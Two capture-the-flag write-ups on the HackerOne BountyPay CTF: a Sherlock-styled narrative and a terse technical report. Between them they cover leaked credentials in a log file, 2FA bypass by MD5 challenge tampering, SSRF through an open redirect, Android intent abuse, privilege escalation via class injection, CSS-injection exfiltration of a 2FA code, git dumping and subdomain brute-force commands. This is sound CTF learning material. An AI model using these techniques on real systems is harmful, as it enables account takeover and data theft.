“Anything interesting in the `request-logger` repo?” said Sherlock as he pulled a chair next to me. “I see you have not had your coffee yet.” He picked my cup and emptied it into his. “I will get you another one. You don’t seem to need it anyway.” 

I wasn’t surprised that he had paid little or no attention to what I was saying. 

“So, the ip address, the uri, the method, and the parameters all get json-ified and then base64 encoded, a timestamp is appended to it and then stored in a file called `bp_web_trace.log`,” said Sherlock squinting at the monitor. “Quick, check if that file is still there on the server. Also, check if it is there on other 

I pointed copied filename, appended it to the url, https://app.bountypay.h1ctf.com/bp_web_trace.log and opened it in my browser thinking this won’t work.

{F863078}

I was surprised to find the file is present on the server and immediately clicked on cancel. Sherlock pointed out,“Why would you do that? Don’t you want to see what’s inside there?”

 “Oh boy, yes we will.” I said. I like using the terminal more. I curled the file and saved it locally as `bp_web_trace.log`

{F863080}

“The dev must have forgotten about the file,” I said. “It’s there for a reason, zer0ttl. You are on the right path,” said Sherlock. A few seconds, later we were looking at the decoded version of the file. “I see, somebody is showing off their bash-fu skills,” chuckled Sherlock.

{F863081}

“Well, it did take some time. I am slowly getting there, Sherlock. This is good. I have a username, a password and a challenge_answer. I wonder what that is. I am going to try these creds. See if they work.”

“I am in. I have access to app.bountypay.h1ctf.com.” I sighed. I was about to take a sip of my coffee when I realised it is empty. “Mrs. Hudson has a pot ready downstairs. And also maybe you are forgeting about the 2FA screen,”said Sherlock. “I will take a look at it when I am back!”

“While you are at it, would you mind getting me another cup? Thank you!

As I climbed down the stairs, I thought to myself, “I do not understand why I tolerate him. Mrs Hudson is also kind to him. I really wonder why?” After exchanging pleasantries with Mrs. Hudson, I was on my way up when I heard,  “Ah ha. This is so simple!” 

I rushed and spilled some coffee on the stairs. “I did it. Bypassed the 2FA for you, here you go,” said Sherlock.

{F863083}

“Ok. This is nice. But how, and why did you not wait for me?” I asked sternly. “It is simple, my friend zer0ttl.” Sherlock continued,“You see the after the login the app asks for a 2fa code. I entered my name there and observed the request/response in burp. Along with ‘username’, ‘password’ a ‘challenge’ and ‘challenge_answer’ parameters are passed in a POST request. You were wondering what the challenge_answer was in bp_web_trace.log file, it was this 2fa code. The challenge part of the request got my attention. It looked like a hash. It had 32 characters in it. MD5 – the first thing that came to my mind. So I put in my name as the ‘challenge_answer’ and md5sum of my name as ‘challenge’. And viola. Entry granted. You do know the md5sum of your name, right zer0ttl?”

I interuppted, “You remember the md5sum of your name?”

To which, he calmly replied, “Yes ofcourse. It comes in handy. You should too. Not the entire thing. Just the beginning and the end.” I looked at the burp requests. He was right.

{F863084}

I retried it with my name and it worked. “Patterns. You tend to recognise patterns over time zer0ttl. All animals recognize patterns. Some get good at it,” said Sherlock while walking back to the window.

{F863085}

Upon successful authentication, a cookie named `token` was granted. The value looked like a base64 encoded version of a json. The ‘eyJ’ at the beginning helped me deduce this. “Patterns,” I thought to myself.

{F863087}

{F863086}

The decoded cookie was indeed a json object. The account_id and hash. After playing with the account_id and hash, I concluded that I could control the value of account_id.

{F863088}

However fiddling with the hash rendered my request useless.

{F863089}

With that information and a sip of coffee, I continued to explore the app on `app.bountypay.h1ctf.com`. The BountyPay Dashboard just had one feature. The user could lookup their transactions based on the month and year.

{F863090}

{F863091}

The burp request for loading transaction gave some interesting output - `url`. What if I visit the url directly? It was the next thing I tried. I got a `[Missing or invalid Token]`.

{F863299}

I wondered if there are transactions from previous months. I sent the request to burp intruder and selected the ‘cluster bomb’ as attack type. It helps you enumerate multiple fields at the same time. It’s a neat trick I learnt in one of the preivous ctfs. I selected the month and the year fields as positions where the payloads will be inserted. Set the payload options as 1 – 12 for month and 2010 to 2020 and fired away.

{F863300}

All the requests returned ‘[]’ for transactions and the ones from the year 2010 returned ‘Month or Year field invalid’. I took a deep breath and a sip from my cup. “What’s the progress zer0ttl?” Sherlock suddenly remembered that we were working on the h1-ctf. After bringing him to speed with the progress, I said “I don’t know what to do ahead.”

“Well, let me walk you through what you have found here. You control the username parameter using the cookie, the request to `/statements?month=03&year=2018` returns a response with `api.bountypay.h1ctf.com`, you cannot access the url from `api.bountypay.h1ctf.com` and the `app.bountypay.h1ctf.com` and `api.bountypay.h1ctf.com` are somehow connected,”said Sherlock.

“Do you think that `app.bountypay.h1ctf.com` is making requests to api.bountypay.h1ctf.com in the backend? I control the username parameter. Maybe, I can use it to do something.” I asked. “Well, time to find it out,” Sherlock answered.

I went back to doing content discovery on api.bountypay.h1ctf.com. I found a open redirect on the `api.bountypay.h1ctf.com`. The front page of `api.bountypay.h1ctf.com` has a link https://api.bountypay.h1ctf.com/redirect?url=https://www.google.com/search?q=REST+API. The url parameter seemed to be vulnerable to open redirection but with a whitelist. It allowed `www.google.com`, `api.bountypay.h1ctf.com`, `software.bountypay.h1ctf.com` but did not allow redirect to any other domains including `app.bountypay.h1ctf.com`.

“So I have an open redirect on api.bountypay.h1ctf.com and I control the username parameter in ‘https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/statements?month=03&year=2018’. What could I possibly do with this?” I asked myself. And then it struck me like a bolt of lightning. “Maybe I could try path injection in username parameter and make requests to the redirect parameter?” I said aloud. “I see you are evolving my friend. Excellent idea!” Sherlock approved.

Time to flex my python skills or as Sherlock Holmes would call it ‘The serpent langua’. I quickly scripted a small function to try various payloads.

{F863303}

It worked like a charm. I felt like a sorcerer. 

{F863304}

“Perfect,” I was excited. I quickly tried to reach the redirect endpoint. After what felt like an eternity I was able to make requests to the redirect path which expects a `url` parameter.

{F863305}

“This is good progress. Do you remember the 401 you got for the `software.bountypay.h1ctf.com` domain? Do you think you could access that using this?” Sherlock said as soon he saw the output matching the one from the browser.

{F863308}

“Let me give it a try,” I said while keying in the input to the `hammer` function.

{F863309}

“It doesn’t return a 401 Unauthorized!” I said. “Well, it doesn’t return a 200 OK either,” said Sherlock. I suspected that something was wrong with the payload. Inspecting the reply in burp, I found out that the trailing `/statements?month=03&year=2018` in the original request was causing a problem. A simple `#` at the end of the payload fixed the challenge.

{F863314}

“What do you say to that Sherlock? Well, it is time to see what is on that domain.” I had recently learnt how to use the turbo intruder and 'boy oh boy' that thing was fast. I believe every hacker should keep this tool handy. Some changes to the hammer function had the turbo intruder script ready in no time. This time I decided to use the raft list first.

{F863315}

{F863319}

The turbointruder did pay off. I got a hit for the `uploads` directory along with `css`, `images` and`js`. The uploads directory had an apk file inside it. “Splendid job zer0ttl. Grab the apk, let’s see what’s inside it. I will go get Mrs. Hudson’s phone for this,” and Sherlock disappeared.

{F863320}

Mrs. Hudson once had a problem with her phone. Since then that phone has become our test android phone. We use it to analyse suspicious android applications. We had rooted the phone, installed some required tools like frida and as a service to Mrs. Hudson removed some bloatware from the phone.

By the time Sherlock was back with Mrs. Hudson’s phone, I compelted the primary analysis of the apk using the jadx tool. “So, the package name is `bounty.pay`; the main activity is `bounty.pay.MainActivity` and there are fours other activites; namely `PartOneActivity`, `PartOneActivity`, `PartThreeActivity` and `CongratsActivity`. There is a..” I was suddenly interrupted with “Where is it? Where is it? It was right here last night?” 

“Are you looking for the usb cable?” I asked. “Yes! Have you se..”I interrupted “It is here with me. Pass me the phone,” Sherlock shrugged. “Don’t like it when somebody interrupts you do you?” I continuted. “There is a firebase database url in `strings.xml`. App doesn’t use any native libraries.” 
“So this should be a piece of cake?” claimed Sherlock. “We will see,” I said while installing the apk to the phone using adb.

I launched the application after installing it. “What are you waiting for? Enter the damn username and twitter handle already?” said Sherlock. “I am doing it, will you be patient!” After geting greeted by a blank screen in PartOneActivity, and clicking on the BountyPay icon for a couple of times, I exclaimed “Now what?”.

{F863321}

“Look at the source!” he replied. I opened up the decompiled `PartOneActivity.java` file. The `onCreate` function particularly caught my attention.

{F863328}

“Sherlock, look at this line of code,” I said. “It has a `getIntent().getData()` function. Some `getQueryParameter(“start”)` and `queryParameter.equals("PartTwoActivity")`. If this condition is met then PartTwoActivity is started. Need to figure out what this line does.”

“So `getIntent()` returns the intent that started the current activity. `GetData()` retrieves data that the current intent is operating on. *This URI specifies the name of the data; often it uses the content: scheme, specifying data in a content provider. Other schemes may be handled by specific activities, such as http: by the web browser.* it says in the documentation. “I do not understand what is going on. *Why is java so difficult to understand!*” I said. “Baby steps, zer0ttl. One thing at a time. So, the intent expects an URI. How does android expect URI to be? Check out `AndroidManifest.xml`,” he continued.

“Under the PartOneActivity, I see a scheme as `one` and host as `part`. This URI has to be `one://part?`” I asked. “Yes indeed. One can have custom URIs in android apps. You already know the queryParameter and its value. What are you waiting for?” said Sherlock. The adb documentation has information about how to start an activity with an intent. Specifiy the component with `-n` and pass the data URI with `-d`. Using this information I crossed my fingers and typed in the command.

{F863334}

To my surprise the phone screen refreshed and the app now displayed PartTwoActivity.

{F863336}

“Time to take a look at `PartTwoActivity.java`”. PartTwoActivity also expected a similar intent URI data as the part one. Two query parameters, first one named `two` with value equal to `light` and the second named `light` with value equal to `on`. “This should be simple,” I said. Well, it wasn’t.

{F863335}

The phone screen refreshed and the PartTwoActivity was still seen on the screen. What went wrong? “It’s always the minor details zer0ttl.”  I noticed that the debug message after the command finished running was the detail Sherlock was talking about. In PartOneActivity there was just one `parameter=value`. However PartTwoActivity expects two parameters and the command somehow only passed the first parameter. The `&` sign and part after it was missing. I then knew that I had to escape the '&' sign with '\'.

{F863337}

I checked the message and both the parameters where now being passed to PartTwoActivity. The phone screen flashed and an input field was exposed along with a hash – `459a6f79ad9b13cbcb5f692d2cc7a94d`. Hashes.org is a neat website to look up hashes. I quickly looked up the hash value. It was a md5sum of ‘Token’. “Is the the answer expected in the input field?” I fumbled while handling the phone and almost dropped the phone. “Careful there. We do not have the budget for a new phone,” exclaimed Sherlock.

{F863339}

`Token` did not work. After a careful review of the code I figured out why.

{F863341}

The value expected was `X-Token`. After giving it the correct value, the app flashed PartThreeActivity. “Just one more obstacle to go to complete the android part,” I said.

By this time I had somewhat mastered the art of reading java. Quickly going through PartThreeActivity.java I figured out the required intent parameters and their values. Passing it to the intent was also not a challenge as we had already done that in PartTwoActivity. This time the ‘=’ sign along with the ‘&’ needed escaping.

{F863346}

Once that was done, we were expected to submit a leaked hash into the app. Now going through the source code for PartThreeActivity, I had noticed some calls to `Log.d()` inside the `performPostCall` function. Log is an API in android to send  log output. You can view these messages with logcat.

I started checking logs in the logcat using adb and indeed there was a hash leaked in the messages. I salvaged a host `HOST IS: : http://api.bountypay.h1ctf.com` and a header value `HEADER VALUE AND HASH : X-Token: 8e9998ee3137ca9ade8f372739f062c1` from the log messages as well. I was hoping this would be useful ahead.

{F863349}

PartThreeActivity was completed. We were greeted with the CongratsActivity and a toast after clicking on the bountypay button “Information leaked here will help with other challenges.” 

{F863350}

It was evening and I did not realise the amount of time we had spent on the android app challenges. It was only when Mrs. Hudson made her way into the room with tea and biscuits. “How does he live in this mess? He should get this cleaned up!” she mumbled while making place for the tea on the table. 
“Oh, Mrs. Hudson thank you so much. And here is your phone. zer0ttl’s cousin is fine. It was rather a mis-understanding between the two,” said Sherlock handing over  the phone to Mrs. Hudson. I was curious and surprised at that statement.
 
“I see you lads haven’t had your lunch yet. I will get you some sandwiches.” 

“Thankyou Mrs. Hudson. That would be lovely. Isn’t Mrs Hudson a lovely lady?” said Sherlock walking towards the window with his 

Tea was as refreshing as the **Congrats** from the app. There was much more to go. The `X-Token` header was the missing piece in making requests to `api.bountypay.h1ctf.com`. Once we had that setup in burp, we could make requests without getting the `Missing or invalid Token` response.

{F863352}

I suspected there could be other api endpoints on the server. I ran the raft list through ffuf but this time with the additional `X-Token` header. There was a `staff` api endpoint on the server.

{F863353}

{F863354}

“Did you find anything interesting?” Sherlock asked me from the corner. “I found a staff endpoint. It is leaking some staff names and staff ids. Other than that I am not able to do anything else.” I replied.

“Did you say a staff id? Oh zer0ttl, remember the twitter account you found in the beginning? I was looking at it and there was some activity on the account. Sandra Allison is their new employee and she has tweeted her id card which has her staff id. I couldn’t find anything else. I wonder if you can use that here?” said Sherlock. “And when were you planning to tell me this piece of intel?”

“When the time was right. Now, is the time I see when you have found the staff endpoint,” replied Sherlock with a sheepish smile. I quickly looked up the twitter account for Bountypay and Sandra Allison was in thier list of followers. She had indeed tweeted a picture of her id which leaked the seemingly random staff id – `STF:8FJ3KFISL3`. This was the fastest progress we’d made during the day. “At this pace, we would be done before dinner!” I said in an excited tone. Little did we know what lay ahead of us.

{F863355}

It had been more than an hour I had made no progress with the staff endpoint. The tea lay half finished besides the laptop and I had hungrily devoured the sandwiches Mrs. Hudson had sent. “Why can’t I get this?” I banged my hand on my table. Sherlock who was now back on the bed said, “Go back to basics zer0ttl. What’s an API? What can you do with an API?”
 
Almost like giving an exam, I replied, “APIs are endpoints to interact with an application. You can `get/put/update/delete` information using an API.”
“Well, you see ze0rttl, you are just trying to get information, have you tried to do anything else here?” he asked. That’s when I knew what I was missing. I immediately changed the request method to `POST` in burp and I saw something other than Sam and Brian.

{F863356}

How did I not think of this myself? `Missing Parameter`. Now I already knew two parameters from looking at Sam and Brian for the past hour. `name` parameter had a response of `Missing Parameter` but `staff_id` displayed the response `Invalid Staff ID`.

 {F863357}

“Finally something new!” I said. “Take a step back now and then. Reflect on what information you have. It helps,” said Sherlock. He was right. Taking a break,  helps your brain process the information it collects. I did not want to say it aloud. I fake smiled. “You know I am right. You just don’t want to accept it. That doesn’t make me wrong though,” smirked Sherlock.

After providing Sandra’s staff id it still said `Invalid Staff ID`. “Maybe it expects the input in a particular format. Just the way it reflects in Sam’s and Brian’s case.”

{F863358}

“Staff Member Account Created” I took a deep breath. “I have access to Sandra’s credentials.” I  said. After a couple of tries, I was able to use the credentials to log  in to `staff.bountypay.h1ctf.com`.

{F863359}

I noticed a few functionalities inside the staff app. Support Tickets feature helped the user to look up their support tickets. The replies to the support ticket were disabled. It displayed the user’s name and profile picture.

{F863361}

The Profile section of the application allowed a user to change their profile name and avatar (profile picture). The profile name and change avatar filtered all the important characters. There was no scope for injection. Everytime I changed the Sandra’s profile name and avatar, I’d be assigned a new token by the server.

{F863362}

The new profile name and avatar would then be reflected into the page with all special characters stripped.

{F863364}

The avatar part was being reflected into a class name. “This is unusual,” I thought.

{F863365}

And, lastly the report this page feature allowed you to report an url to admin. The admin views the url. The url parameter is embedded in every page. It was always a base64 encoded of the current path.

{F863366}

{F863367}

{F863369}

There was a javascript file that was referenced by the web application. There was a reference to an admin feature where a an admin user could upgrade a user to an admin. It was pretty clear that what was to be done next. “I can report a link to an admin user. An admin user will visit that link. I want  to make the new hire, Sandra, to an admin user. I need to exploit the report functionality such that when the admin user visits a malicious URL, Sandra becomes an admin. Great,” I said. “Well this should be interesting,” Sherlock was up and next to me in no time.

{F863370}

I tried to recreate the request for upgrading an user in burp. Sherlock exclaimed, “If it were only that simple.” “Doesn’t hurt to try, now does it? - Was it you who said this before?” We both laughed.

{F863371}

The `document.location.hash` part in the end of the js file was interesting. The `document.location.hash` returns the part of the url after the `#` sign. The `tab1`, `tab2`, `tab3` where the names of classes for `Home`, `Support Tickets` and `Profile` sections of the applications. The `tab1`, `tab2`, `tab3` where the names of classes for `Home`, `Support Tickets` and `Profile` sections of the applications. “So I can redirect an user based on the `#tab` passed in the url and the js file takes care of trigger the click,” I noted.

{F863372}

{F863374}

{F863373}

“`upgradeToAdmin` and `sendReport` are class names. Remember once we spent an entire weekend learning javascript and jquery learning because Mycroft wanted to upgrade some features on his website? That was cumbersome. It’s paying off now.”

“It is part of the job. You never know what information can be utilised in what manner. The more you know, the better you get at your job, zer0ttl,” Sherlock said. 

“So #tab1 triggers a click on that particular class. I can inject into a class name using the change profile section. This means that if I can inject the class name `upgradeToAdmin tab1` into the class name and request a page that has this injected class along with #tab1, the page should trigger the javascript function `$(".upgradeToAdmin").click(function()`. This is cool." I said.

Upon examining the source of the page I realised that the profile section is always present in the page but hidden. However, I cannot send the home page or the profile section as the user’s avatar needs to reflect my injected class names. The ticket detail page at `/template=ticket&ticket_id=3582` was the perfect candidate as this page would reflect the injected class irrespective of who was viewing the page.

{F863376}

I set the profile avatar and verified if the injected class name was indeed being reflected in the page.

{F863378}

{F863377}

“Time to check if our theory for document.location.hash and class names works.” I visited the URL https://staff.bountypay.h1ctf.com/?template=home#tab1

{F863379}

The burp history recorded request going to `/admin/upgrade?username=undefined`. I was happy with the progress. “Baby steps,” I mumbled.

“Now you just need to find a way to pass the username to that function,” said Sherlock. “I either need to find an html injection or find a page which has an input field with name attribute set to `username`,” I said. 

“The comment section has a disabled input field and the profile section has an input field with name set to profile_name. Both are not useful,” I continued. Sherlock was smiling, he knew something, “If I tell you, how will you learn zer0ttl?”, he replied. “Let me open the window for you. Maybe the fresh air might trigger something in your mind.” he said as he walked towards the window. 

The draft of cold breeze was definately refreshing. I closed my eyes for a bit, took a deep breath, “I got to finish this!” I said to my self. Content discovery did not find anything new. “Maybe you start again,” Sherlock suggested.

Dejected I cliked on logout and was redirected to the login page and there was an input field. I hurried to check the attribute of that input field. It said ‘name=”username”’. “I found it. I found it. “It was right there all this time. How did I miss this?” I exclaimed.

“It’s the simple things in life, zer0ttl,” Sherlock smiled.

{F863380}

I now needed to somehow stitch the login page and the ticket detail page so that a request with the username=sandra.allison is sent to `admin/upgrade`. I tried adding multiple templates but it displayed only the last template. The login page accepted GET request, where the parameter username was reflected in the input field.

{F863382}

I had seen this behaviour earlier. “What if I pass the template as an array?” I thought.

{F863383}

The array trick had worked. The login page and the ticket detail page were rendered on the same page.

 I immediately added the document hash and the username parameter to the url and fired it away. https://staff.bountypay.h1ctf.com/?template[]=login&username=sandra.allison&template[]=ticket&ticket_id=3582#tab1

{F863384}

I reported the base64 encoded URL and there was a new token in the response. I pasted the new token in my browser’s cookie section. And I refreshed the page.

{F863385}

{F863387}

There was a new Admin section. I had escallated sandra.allison to admin. “Fresh air did help Sherlock. I have the credentials for marten.mickos.” The login creds were for app.bountypay.h1ctf.com as brian’s credentials were the same as I had discovered in the log file on app.bountypay.h1ctf.com.

{F863386}

“This is over. It was a gruelling journey. Finally it’s done,” I bypassed the 2fa using the same trick used for Brian’s creds and was greeted with the dashboard. The original tweet mentioned transactions for May 2020. I changed the month to `05` and clicked on Load Transactions. The `Pay` button was waiting to be clicked.

{F863389}

The smirk was wiped off my face like sand castles on a beach.

{F863388}

There was another 2fa to be bypassed. “Ha ha ha. You thought it was over?” Sherlock laughed. I gathered whatever energy I had left in me, “Damn this!” and clicked on `Send Challenge`. I wanted to get done with this quickly. The browser sent a POST request with `app_style` as the parameter. This was a css file.  The response contained a `challenge_timeout` and a `challenge` value.

{F863391}

The lenght of the 2FA code was 7 characters.

{F863390}

When a code was entered on the screen, the browser made a POST request with the `challenge_timeout`, `challenge` and `challenge_answer` in the POST body. I knew what had to be done. I remebered a video I’d seen by @liveoverflow, where he spoke about data exfiltration using css. This had to be it.

I had a sick feeling in my stomach. I mumbled, “I have never done this before.”. Sherlock said, “Well, now’s a great opportunity to learn then.”

After spending a couple of hours, combing through how css selectors work and how they can be used to manipulate data I came up with a strategy. 

“Listen to this. Css selectors can work on html elements, element attributes and attribute values,” I explained my strategy, “The article by Mike Gualtieri mentions that attribute values can be extracted using css injection. So I think the 2fa code is embedded inside the 2fa app in this fashion - `<htmlElement blah=”2FA-CODE” ></htmlElement>`. If I can find the element and attribute that stores the 2FA code I can exfil that code.”

Sherlock curiously enquired, “Have you tested for simple things like html injection or xss attacks? Have you confirmed that this is indeed a css exfil challenge?” I confirmed that app special characters like ‘, “, <, > are filtered.  

“I needed one thing to confirm css injection. A public server which could serve my malicious css and I could receive call backs from the injected css. This server had to be an https capable server. I had learnt this the hard way from many ctfs before.

Also, I had to make sure that my server serves the css with content-type as `text/css` and not `text/plain`” I was thinking aloud when Sherlock interupped, “Your blog to host the css and burp collaborator for callbacks. Come on then, wrap this up quickly. I haven’t got all night. Chop chop.”

I created a simple poc based on the original css at the url https://www.bountypay.h1ctf.com/css/uni_2fa_style.css. I replaced the image url with a callback for my burp collaborator server.

{F863392}

I sent the POST request with app_style parameter and polled the collaborator client. There were two reqeusts from ip `3.21.98.146`. This was the IP address of \*.bountypay.h1ctf.com server. The HTML request was for `/cssLoaded` endpoint.

{F863394}

“This is indeed a ‘data exfiltration using css injection’ challenge, Sherlock.” Next I had to enumerate the html elements on the page. I incorporated the changes to search for the usual suspects – body, head, input, a tags.

{F863394}

I got callbacks for body, input and head elements. “Sherlock, I am pretty confident that this input tag must contain the 2fa code. Now, I need to find the names of the attributes.”

{F863395}

I checked the source for the 2FA page and came up with a list of candidates. The `value` attribute of an input elements hold the value for the current input. I modified the css file to incorporate the changes. The mozilla developer documentation for css selectors was quite helpful in figuring out the syntax. The `input[value]` selects input elements with value attribute set. The call back to ‘/input_elm_value_attrib’ confirmed this.

{F863398}

{F863396}

“Time for data exfil,” I said. The `input[value*="a"]` selects input elements with attribute named `value` which contains substring `a`. This way you can create call backs for characters a-z,A-Z,0-9. I added these callbacks to the css file.

{F863397}

The collaborator client had received 7 callbacks.

{F863400}

The callbacks where however not in the correct order. I stared at the screen for a while, thinking about the attack. “So I have a code, not in correct order. I need to brute force it. There is a timestamp for 2 minutes. I need to perform css injection. Collect the the characters, create word list, brute force the 2FA before the timestamp expires. A symphony of multiple things put together to crack the 2FA code. This has to be the last stage. I am tired.” I said. 

“You can do this zer0ttl. You have to see this through,” Sherlock motivated me.

I wrote a python code to create a brute-force worldlist for the 2FA code and a turbo intruder script to brute force the 2FA.

{F863401}

{F863402}

I mentally made a note of all the steps and the order in which they should be performed. “Send the 2FA reqeust with injected css. Copy the challenge_timeout and challenge from the response and paste it in the turbo intruder. Poll the collaborator client for 2FA characters. Paste those chars in the python code and generate the wordlist. Copy the name of the wordlist and paste it in turbointruder, attack and keep your fingers crossed.” I sighed repeating the steps aloud. “God speed to you zer0ttl.”

The first time only 6 characters were returned meaning one of the characters was repeated. I geared up once again for the attack. After a few retries, I was able to get 7 call backs. By the time I clicked on `attack` in turbointruder my throat was dry as the Sahara. “That was intense!” said Sherlock. We stared for something to pop up in turbointruder, and there it was.

{F863405}

One of the requests had returned 200 status. “Could this be it?” I thought. Before I could click on the link, Sherlock snatched the mouse and clicked on the request.

{F863406}

“CTF Challenge Completed!” I was overwhelmed, I could not believe what I was seeing onscreen. I yelled and shrieked in excitement, “It’s done!” Sherlock said, “You are scaring Mrs. Hudson” I had not realised the time. I got up from the chair and walked to the window. It was chilly outside. Puncturing my perfect moment, he said, “You do know you have to write the report for this for a chance to win the invitation to the private event right?”

“Let me enjoy this moment Sherlock. I have an idea for the report.”

“Care for a bite? All this brain draining excersises has gotten me hungry. Let’s hope the place near the station is still open. Here take your coat. Also, let’s hope that this report of yours is seen by the right people and acts as an advertisement to get us some more work,” said Sherlock as he made his way downstairs.

## Impact

The flag : 736c635d8842751b8aafa556154eb9f3

---

### [[H1-2006 2020] CTF Writeup!](https://hackerone.com/reports/889293)

- **Report ID:** `889293`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** h1-ctf
- **Reporter:** @sw33tlie
- **Bounty:** - usd
- **Disclosed:** 2020-06-17T23:32:52.200Z
- **CVE(s):** -

**Vulnerability Information:**

The Beginning
=====================
The scope of the H1-2006 CTF was `*.bountypay.h1ctf.com`.
After opening `https://bountypay.h1ctf.com`, I noticed that on the top left of the screen there was a dropdown with two login pages: one for Customers  (`https://app.bountypay.h1ctf.com/`) and one for Staff (`https://staff.bountypay.h1ctf.com/`).
I used [ffuf](https://github.com/ffuf/ffuf) with [the fuzz.txt wordlist by Bo0oM](https://github.com/Bo0oM/fuzz.txt/blob/master/fuzz.txt)  to quickly enumerate files and folders on the first subdomain:
```
ffuf -c -w ~/wordlists/fuzz.txt -u https://app.bountypay.h1ctf.com/FUZZ
```
When it finished I noticed that there was a `.git` folder...interesting!

The exposed .git repo
=====================
{F852139}
The best way to get all files out of a .git repository is by using a script like gitdumper.sh from [GitTools](https://github.com/internetwache/GitTools/tree/master/Dumper)...so I run the following command:

```bash
./gitdumper.sh https://app.bountypay.h1ctf.com/.git/ app
```
The app/.git/config file looked like this:
```
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = https://github.com/bounty-pay-code/request-logger.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
	remote = origin
	merge = refs/heads/master
```
At this point I tried to open `https://github.com/bounty-pay-code/request-logger.git` in my browser and that GitHub repo was not private!
 I found the source code of `logger.php`:
```
<?php

$data = array(
  'IP'        =>  $_SERVER["REMOTE_ADDR"],
  'URI'       =>  $_SERVER["REQUEST_URI"],
  'METHOD'    =>  $_SERVER["REQUEST_METHOD"],
  'PARAMS'    =>  array(
      'GET'   =>  $_GET,
      'POST'  =>  $_POST
  )
);

file_put_contents('bp_web_trace.log', date("U").':'.base64_encode(json_encode($data))."\n",FILE_APPEND   );
```
The log file
=====================

I quickly checked if `bp_web_trace.log` existed at`https://app.bountypay.h1ctf.com/bp_web_trace.log` and sure thing it did!
This was its content:
```
1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==
1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==
1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19
1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==
```
From the PHP source code, I knew these were UNIX timestamps +  base64 encoded strings.
After decoding them, this is what I got:
```
05/08/2020 @ 9:58am:{"IP":"192.168.1.1","URI":"\/","METHOD":"GET","PARAMS":{"GET":[],"POST":[]}}
05/08/2020 @ 9:58am:{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX"}}}
05/08/2020 @ 9:58am:{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX","challenge_answer":"bD83Jk27dQ"}}}
05/08/2020 @ 9:59am:{"IP":"192.168.1.1","URI":"\/statements","METHOD":"GET","PARAMS":{"GET":{"month":"04","year":"2020"},"POST":[]}}
```
At this point, I had a username, a password, a challenge_answer, and a few other things!
I tried to log in with those credentials at `https://app.bountypay.h1ctf.com/`:
{F852142}
And it worked, sort of!
There was a 2-factor authentication in place.
I tried to use the challenge_answer code that I got before but it didn't work.
{F852143}
After analyzing the HTTP request with Burp Suite:
```http
POST / HTTP/1.1
Host: app.bountypay.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 103
Origin: https://app.bountypay.h1ctf.com
Connection: close
Referer: https://app.bountypay.h1ctf.com/
Upgrade-Insecure-Requests: 1

username=brian.oliver&password=V7h0inzX&challenge=f72a37dc583456150a13bd8b3b19433d&challenge_answer=letmein
```
...I noticed that there was a `challenge` parameter that looked like an MD5 hash.
To log in successfully, I tried to encode as MD5 the text I wrote (in my case, the word `letmein`) and then I replaced the `challenge` parameter with it (`0d107d09f5bbe40cade3de5c71e9e9b7`)...it worked!

The BountyPay dashboard
=====================
At this point, I saw this dashboard:
{F852144}
The load transactions button was useless: I couldn't get any info no matter what month/year I selected.
After a further look, i noticed that the `token` cookie for that webpage was actually a base64 encoded string:
```http
GET / HTTP/1.1
Host: app.bountypay.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://bountypay.h1ctf.com/
Connection: close
Cookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```
When I decoded it, I got a JSON string:
```json
{"account_id":"F8gHiqSdpK","hash":"de235bffd23df6995ad4e0930baac1a2"}
```
After playing a bit more with this, I realized that by leveraging the account_id it was possible to achieve a path traversal. 

A rabbit hole
=====================
Now that I had a path traversal, what could I do with it?
I literally had no idea, so I tried to brute-force some subdomains.
To do so, I used [zdns](https://github.com/zmap/zdns), [subgen](https://github.com/pry0cc/subgen) and [shubs-subdomains.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/shubs-subdomains.txt) :
```bash
cat ~/SecLists/Discovery/DNS/shubs-subdomains.txt | subgen -d bountypay.h1ctf.com | zdns A --name-servers 1.1.1.1 --threads 500 | jq -r "select(.data.answers[0].name) | .name" 
bountypay.h1ctf.com
